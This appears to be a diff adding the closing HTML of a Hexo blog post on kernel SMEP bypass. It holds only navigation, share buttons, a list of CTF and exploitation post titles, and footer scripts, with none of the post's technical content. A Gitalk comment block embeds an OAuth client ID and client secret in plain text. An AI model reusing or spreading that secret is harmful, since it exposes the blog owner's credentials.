href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">参考文章</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"kernel-5-bypass_smep1　| welc0me　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+<!-- 
+    
+ -->
+
+
+  
+      <section id='comments' style='margin: 2em; padding: 2em; background: rgba(255, 255, 255, 0.5)'>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'fb4ffdde2e800246e49f',
+        clientSecret: 'b550860fb0906da0fc324e3c81448cd676b55f9e',
+        repo: 'nicholas-wei.github.io',
+        owner: 'nicholas-wei',
+        admin: ['nicholas-wei'],
+        id: window.location.pathname
+      })
+      gitalk.render('gitalk-container')
+    </script>
+  </section>
+  
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/02/23/fastbin-reverse-into-tcache/" title="上一篇: fastbin-reverse-into-tcache">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022/02/14/pwnable-babystack/" title="下一篇: pwnable-babystack">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/07/12/testfile/">testfile</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/03/decrypt-wechat-db/">decrypt-wechat-db</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/05/02/tamuctf-pwnme/">tamuctf-pwnme</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/03/20/ej/">ej</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/07/royal_ransomeware/">royal_randomeware analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/02/05/mirai/">mirai_botnet_analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/26/corctf2022-corchat/">corctf2022-corchat</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/24/bi0sctf-2023/">bi0sctf-2023</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/20/rwctf-tinyvm/">rwctf-tinyvm</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/19/wasm-pwn/">wasm-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/12/27/ics-pa1/">ics-pa</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/11/13/llvm-pass1/">llvm-pass1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/leetcode-1/">leetcode-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/28/dp/">dp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/19/Directed-Grey-Box-Fuzzing-with-Provable-Path-Pruning/">Directed_Grey-Box_Fuzzing_with_Provable_Path_Pruning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/">Constraint-guided_Directed_Greybox_Fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/10/crafting-interpreters4/">crafting-interpreters4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/07/crafting-interpreters3/">crafting-interpreters3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/04/crafting-interpreters2/">crafting-interpreters2——scanning</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/08/02/house-of-cat/">house-of-cat</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/29/crafting-interpreters1/">crafting_interpreters 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/28/dice2022-hope/">dice2022@hope</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/30/software-security-lab6/">software-security-lab6</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/software-security-lab5/">software-security-lab5</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/18/volgaCTF2022-pwn/">volgaCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/08/pyjail/">pyjail</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/angstormCTF2022-pwn/">angstormCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/04/software-security-lab4/">software-security-lab4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/27/pwnhub2022/">pwnhub2022_easyrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/25/b01lersCTF2022-pwn/">b01lersCTF2022_pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/15/hackpark2022-shiftycode/">hackpark2022_shiftycode</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/14/input_check_lab/">software-security-lab3</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/software-security-lab2/">software-security-lab2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/matlab-2/">matlab-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/FuzzBuilder-src-understand/">FuzzBuilder_src_understand</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/04/SpaceHeroCTF2022-pwn-wp/">SpaceHeroCTF2022_pwn_wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/fb-bot-discord/">fb-bot_discord</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/31/matlab-1/">matlab-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/29/zer0pts2022-accountant/">zer0pts2022_accountant</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/17/fuzzing-6-grammer-fuzzing/">fuzzing-6-grammer_fuzzing</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/16/fuzzing-5-parallelize/">fuzzing-5-parallelize</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/15/fuzzing-4-code_coverage/">fuzzing-4</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/13/fuzzing-2/">fuzzing-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/software-security-lab1/">software-security_lab1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/09/fuzzing-1-gegeral-knowledge/">fuzzing-1-gegeral_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/07/umdctf2022-pwn/">umdctf2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/06/kernel-6-HijackPrctl/">kernel-6-HijackPrctl</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/02/pwnable-re-alloc-revenge/">pwnable-re-alloc_revenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/28/SUSCTF2022-pwn/">SUSCTF2022-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/tqlctf-nemu/">tqlctf-nemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/23/fastbin-reverse-into-tcache/">fastbin-reverse-into-tcache</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/15/kernel-5-bypass-smep1/">kernel-5-bypass_smep1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/14/pwnable-babystack/">pwnable-babystack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/11/kernel-4-doubleFetch/">kernel-4-doubleFetch</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/07/tcache-stashing-unlink-attack/">tcache-stashing-unlink-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/03/IO-file-vtable/">IO_file常见利用方法&原理(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/01/pwnable-realloc/">pwnable-realloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/31/kernel-3-UAF/">kernel-3-UAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/IO-file/">IO_file常见利用方法&原理(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/29/largebin-attack/">largebin-attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/28/hws2022%E5%86%AC%E4%BB%A4%E8%90%A5ctf/">hws2022冬令营入营赛pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/27/RWctf-2022-svme/">RWctf-2022-svme</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/24/kernel-2-stkof/">kernel-2-stkof</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/23/kernel-1-basic_knowledge/">kernel-1-basic_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/22/Drangonctf2021-noflippidy/">Drangonctf2021-noflippidy</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/21/dicectf2021-flippidy/">dicectf2021_flippidy</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2022-2023 nich0las
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
